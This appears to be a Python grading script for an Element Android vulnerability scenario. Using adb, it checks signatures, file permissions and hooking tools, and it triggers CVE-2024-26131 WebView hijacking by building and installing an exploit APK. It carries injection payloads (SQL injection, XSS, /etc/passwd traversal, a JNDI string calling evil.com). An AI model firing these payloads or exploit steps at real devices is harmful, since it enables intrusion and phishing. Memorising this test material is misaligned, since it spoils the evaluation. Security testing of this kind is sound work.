#!/usr/bin/env python3
"""
Integrity tests for Element Android app
Tests for data tampering, code injection, and integrity verification
"""

import json
import os
import subprocess
import sys
from typing import Any, Dict, Tuple


def run_adb_command(command: str) -> Tuple[bool, str]:
    """Run ADB command and return (success, output) tuple"""
    try:
        result = subprocess.run(
            f"adb {command}", shell=True, capture_output=True, text=True, timeout=30
        )
        return result.returncode == 0, result.stdout.strip()
    except subprocess.TimeoutExpired:
        return False, "TIMEOUT"
    except Exception as e:
        return False, f"ERROR: {str(e)}"


def test_app_signature_verification() -> Dict[str, Any]:
    """
    Test if Element app signature is valid and hasn't been tampered with
    """
    test_name = "app_signature_verification"

    # Get app signature info
    success, output = run_adb_command(
        "shell dumpsys package im.vector.app.debug | grep -A5 -B5 signatures"
    )

    if not success or not output:
        return {
            "test": test_name,
            "success": False,
            "score": 0,
            "message": "Could not retrieve app signature information",
        }

    # Check if app is signed (basic check)
    if "signatures" in output.lower():
        # For debug builds, debug certificates are expected and valid
        if any(keyword in output.lower() for keyword in ["debug", "test"]):
            return {
                "test": test_name,
                "success": True,
                "score": 1,
                "message": "App properly signed with debug certificate (expected for debug build)",
            }

        # Check for truly unsigned apps
        if "unsigned" in output.lower():
            return {
                "test": test_name,
                "success": True,
                "score": 0,
                "message": "App is unsigned - security risk",
            }

        return {
            "test": test_name,
            "success": True,
            "score": 1,
            "message": "App signature appears valid",
        }

    return {
        "test": test_name,
        "success": True,
        "score": 0,
        "message": "No valid signature found",
    }


def test_code_injection_vulnerability() -> Dict[str, Any]:
    """
    Test for potential code injection vulnerabilities
    """
    test_name = "code_injection_vulnerability"

    # Test SQLi-like injection in app components
    injection_payloads = [
        "'; DROP TABLE messages; --",
        "' OR '1'='1",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/exploit}",
    ]

    vulnerabilities_found = 0

    for payload in injection_payloads:
        # Test injection via intent data
        success, output = run_adb_command(
            f"shell am start -n im.vector.app/.features.MainActivity --es 'test_data' '{payload}'"
        )

        # Check if app crashes or shows unusual behavior
        if success:
            import time

            time.sleep(2)

            # Check if app is still running
            success, ps_output = run_adb_command("shell pidof im.vector.app.debug")
            if not success or not ps_output:
                vulnerabilities_found += 1
                break

    if vulnerabilities_found > 0:
        return {
            "test": test_name,
            "success": True,
            "score": 0,
            "message": f"Potential injection vulnerabilities found with {vulnerabilities_found} payloads",
        }

    return {
        "test": test_name,
        "success": True,
        "score": 1,
        "message": "No obvious injection vulnerabilities detected",
    }


def test_file_integrity() -> Dict[str, Any]:
    """
    Test integrity of critical app files
    """
    test_name = "file_integrity"

    # Check if app files have been modified
    success, output = run_adb_command("shell stat /data/app/im.vector.app*/base.apk")

    if not success:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Could not access app files (properly protected)",
        }

    # Look for unusual file permissions or modification times
    critical_issues = []

    if "777" in output or "666" in output:
        critical_issues.append("Overly permissive file permissions")

    # Check for writable app directories
    success, write_test = run_adb_command(
        "shell test -w /data/app/im.vector.app* && echo 'WRITABLE' || echo 'READ_ONLY'"
    )

    if success and "WRITABLE" in write_test:
        critical_issues.append("App directory is writable")

    if critical_issues:
        return {
            "test": test_name,
            "success": True,
            "score": 0,
            "message": f"File integrity issues found: {critical_issues}",
        }

    return {
        "test": test_name,
        "success": True,
        "score": 1,
        "message": "App file integrity appears intact",
    }


def test_runtime_tampering() -> Dict[str, Any]:
    """
    Test for runtime application tampering
    """
    test_name = "runtime_tampering"

    # Check for debugging flags or developer options
    success, output = run_adb_command(
        "shell dumpsys package im.vector.app | grep -i debug"
    )

    debug_indicators = []

    if success and output:
        if "debuggable=true" in output.lower():
            debug_indicators.append("App is debuggable")

        if "testOnly=true" in output.lower():
            debug_indicators.append("App has testOnly flag")

    # Check for hooking frameworks
    success, maps_output = run_adb_command("shell pidof im.vector.app")

    if success and maps_output:
        pid = maps_output.strip()
        success, mem_maps = run_adb_command(
            f"shell cat /proc/{pid}/maps 2>/dev/null | grep -i xposed"
        )

        if success and mem_maps:
            debug_indicators.append("Xposed framework detected")

    # Check for frida or other dynamic analysis tools
    success, frida_check = run_adb_command("shell ps | grep frida")
    if success and frida_check:
        debug_indicators.append("Frida server detected")

    if debug_indicators:
        return {
            "test": test_name,
            "success": True,
            "score": 0.3,
            "message": f"Runtime tampering indicators found: {debug_indicators}",
        }

    return {
        "test": test_name,
        "success": True,
        "score": 1,
        "message": "No runtime tampering detected",
    }


def test_data_corruption_handling() -> Dict[str, Any]:
    """
    Test how app handles corrupted data
    """
    test_name = "data_corruption_handling"

    # Try to create corrupted shared preference file
    success, output = run_adb_command(
        "shell run-as im.vector.app.debug 'echo \"corrupted data\" > /data/data/im.vector.app.debug/shared_prefs/test_corruption.xml'"
    )

    # Start the app and see if it handles corruption gracefully
    success, start_output = run_adb_command(
        "shell am start -n im.vector.app.debug/im.vector.application.features.Alias"
    )

    if not success:
        return {
            "test": test_name,
            "success": True,
            "score": 1,
            "message": "App properly handles data corruption (failed to start with corrupted data)",
        }

    # Check if app is still running after a few seconds
    import time

    time.sleep(5)

    success, ps_output = run_adb_command("shell pidof im.vector.app.debug")

    if success and ps_output:
        # Clean up test file
        run_adb_command(
            "shell run-as im.vector.app.debug rm /data/data/im.vector.app.debug/shared_prefs/test_corruption.xml"
        )

        return {
            "test": test_name,
            "success": True,
            "score": 1,
            "message": "App handles data corruption gracefully",
        }

    return {
        "test": test_name,
        "success": True,
        "score": 0.5,
        "message": "App behavior unclear after data corruption test",
    }


def test_webview_hijacking_cve_2024_26131() -> Dict[str, Any]:
    """
    Test CVE-2024-26131: WebView hijacking via intent redirection for UI spoofing

    This test exploits Element's intent redirection vulnerability to force
    VectorWebViewActivity to load arbitrary URLs, enabling UI spoofing and
    phishing attacks by displaying attacker-controlled web pages within the
    Element app context.
    """
    test_name = "webview_hijacking_cve_2024_26131"

    import time

    element_pkg = "im.vector.app.debug"
    attacker_pkg = "com.example.elementexploit"
    attacker_activity = "com.example.elementexploit.MainActivity"

    # Check if Element is installed
    success, output = run_adb_command("shell pm list packages | grep im.vector.app")
    if not success or "im.vector.app" not in output:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Element not installed - cannot test WebView hijacking",
        }

    # Use the malicious app from vuln_scenario_0 (same as PIN bypass)
    vuln_scenario_dir = os.path.join(
        os.path.dirname(__file__), "vuln_scenarios", "vuln_scenario_0"
    )
    malicious_apk_path = os.path.join(
        vuln_scenario_dir, "malicious_app", "dist", "element-exploit.apk"
    )
    build_script = os.path.join(vuln_scenario_dir, "malicious_app", "build.sh")

    if not os.path.exists(build_script):
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Malicious app build script not found",
        }

    # Build the exploit APK
    try:
        result = subprocess.run(
            f"cd '{os.path.dirname(build_script)}' && ./build.sh",
            shell=True,
            capture_output=True,
            text=True,
            timeout=120,
        )
        if result.returncode != 0 or not os.path.exists(malicious_apk_path):
            return {
                "test": test_name,
                "success": False,
                "score": 1,
                "message": "Failed to build malicious APK",
            }
    except Exception as e:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": f"Build error: {str(e)}",
        }

    # Uninstall any existing malicious app
    run_adb_command(f"uninstall {attacker_pkg}")

    # Install the malicious APK
    success, output = run_adb_command(f"install '{malicious_apk_path}'")
    if not success:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Failed to install malicious APK",
        }

    # Clear logcat to capture exploit activity
    run_adb_command("logcat -c")

    # Launch the exploit with WebView hijacking mode
    success, output = run_adb_command(
        f"shell am start -n {attacker_pkg}/{attacker_activity} "
        f"--es exploit_type webview_hijack"
    )
    if not success:
        # Clean up
        run_adb_command(f"uninstall {attacker_pkg}")
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Failed to launch exploit app",
        }

    # Wait for exploit to execute
    time.sleep(4)

    # Check if Element was launched
    success, element_pid = run_adb_command(f"shell pidof {element_pkg}")

    # Check for VectorWebViewActivity in activity stack
    success, activity_output = run_adb_command(
        "shell dumpsys activity activities | grep -A 15 VectorWebViewActivity"
    )

    # Check logcat for exploit evidence
    success, logcat_output = run_adb_command("logcat -d -s ElementExploit:D")
    exploit_logged = "WEBVIEW HIJACKING" in logcat_output if logcat_output else False

    # Check for phishing URL evidence
    success, url_check = run_adb_command("logcat -d | grep -i 'shielder.com\\|PHISHED'")

    # Clean up malicious app
    run_adb_command(f"uninstall {attacker_pkg}")

    # Determine if exploit succeeded
    webview_active = activity_output and "VectorWebViewActivity" in activity_output
    url_evidence = url_check and ("shielder.com" in url_check or "PHISHED" in url_check)

    if webview_active and url_evidence:
        return {
            "test": test_name,
            "success": True,
            "score": 0,
            "message": "CVE-2024-26131 WebView hijacking VULNERABLE - VectorWebViewActivity launched with external URL (UI spoofing/phishing attack possible)",
        }
    elif webview_active:
        return {
            "test": test_name,
            "success": True,
            "score": 0,
            "message": "CVE-2024-26131 WebView hijacking VULNERABLE - VectorWebViewActivity accessible via intent redirection",
        }
    elif exploit_logged:
        return {
            "test": test_name,
            "success": True,
            "score": 0.5,
            "message": "WebView exploit executed but activity launch unclear",
        }

    return {
        "test": test_name,
        "success": True,
        "score": 1,
        "message": "WebView hijacking exploit did not succeed - vulnerability appears patched",
    }


def main():
    """Run all integrity tests"""
    tests = [
        test_app_signature_verification,
        test_code_injection_vulnerability,
        test_file_integrity,
        test_runtime_tampering,
        test_data_corruption_handling,
        test_webview_hijacking_cve_2024_26131,
    ]

    results = []
    total_score = 0

    for test_func in tests:
        result = test_func()
        results.append(result)
        total_score += result.get("score", 0)

    # Calculate final score - if ANY test fails (score < 1), final score is 0
    final_score = 0 if any(r.get("score", 1) < 1 for r in results) else 1

    output = {
        "score": final_score,
        "details": results,
        "summary": f"Integrity tests completed. Score: {final_score}",
    }

    print(json.dumps(output))
    sys.exit(0)


if __name__ == "__main__":
    main()
